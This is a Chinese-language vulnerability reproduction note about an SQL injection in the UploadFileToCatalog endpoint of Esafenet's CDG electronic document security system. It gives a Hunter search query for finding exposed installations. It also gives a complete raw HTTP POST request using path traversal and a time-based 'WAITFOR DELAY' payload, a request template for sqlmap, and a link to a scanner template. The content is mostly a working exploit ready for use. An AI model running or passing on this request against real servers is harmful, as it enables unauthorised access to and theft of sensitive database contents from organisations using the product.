# 亿赛通电子文档安全管理系统UploadFileToCatalog存在SQL注入漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统UploadFileToCatalog存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/y6kVJz2P66ut0NRz/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-025518.png)

# 四、漏洞复现
```plain
POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
 
id=1';WAITFOR DELAY '0:0:3'--
```

![1706846059605-f7ed0a2e-dbb7-44ef-9c48-e5b0f1a2f537.png](./img/y6kVJz2P66ut0NRz/1706846059605-f7ed0a2e-dbb7-44ef-9c48-e5b0f1a2f537-509400.png)

sqlmap

```plain
POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
 
id=1
```

![1706846164296-703acde3-d5a8-4c72-9488-6605e2983e68.png](./img/y6kVJz2P66ut0NRz/1706846164296-703acde3-d5a8-4c72-9488-6605e2983e68-116124.png)

[亿赛通电子文档安全管理系统-uploadfiletocatalog-sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621695023-2321bd4d-69db-4840-bf2c-1e878213aca0.yaml)



> 更新: 2024-04-20 22:01:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bxi5rg5edb19fsou>